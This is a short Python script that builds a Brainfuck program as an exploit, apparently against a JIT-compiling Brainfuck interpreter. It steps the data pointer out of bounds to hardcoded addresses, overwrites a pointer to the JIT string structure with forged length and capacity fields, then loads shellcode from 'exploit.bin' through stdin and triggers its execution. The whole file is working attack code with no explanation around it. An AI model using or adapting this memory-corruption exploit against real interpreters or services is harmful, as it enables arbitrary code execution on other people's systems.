import struct

bf_zero = "[-]" # set cell to zero
bf_read_to_null = ",[>,]>" # read input from stdin to null (with)
bf_read_byte = ",>" # read byte from stdin

ctx_mem = 0x0040D068 # pointer at begining
jit_ptr_dec = 0x0040D02C # pointer to jit string to overwrite

bf_code = ""
bf_code += '<' * (ctx_mem - jit_ptr_dec)

for elem in struct.pack("<I", ctx_mem + 12):
  bf_code += bf_zero
  bf_code += '+' * ord(elem)
  bf_code += '>'
bf_code += '>' * (ctx_mem - jit_ptr_dec - 4)
# now jit_ptr_dec points at string in ctx_mem

in_file = open("exploit.bin", "rb")
in_data = in_file.read()
in_file.close()

data_len_u32 = struct.pack("<I", len(in_data));
# generate string.length
for elem in data_len_u32:
  bf_code += '+' * ord(elem) + '>'
# generate string.capacity
for elem in data_len_u32:
  bf_code += '+' * ord(elem) + '>'
# generate string.unknown
bf_code += '>>>>'

last_bytes = ""
for elem in in_data:
  if ord(elem) == 0:
    last_bytes = ""
    bf_code += bf_read_to_null
  else:
    last_bytes += bf_read_byte
bf_code += last_bytes

bf_code += '<' # run exploit

out_file = open("exploit.bf", "w")
out_file.write(bf_code);
out_file.close();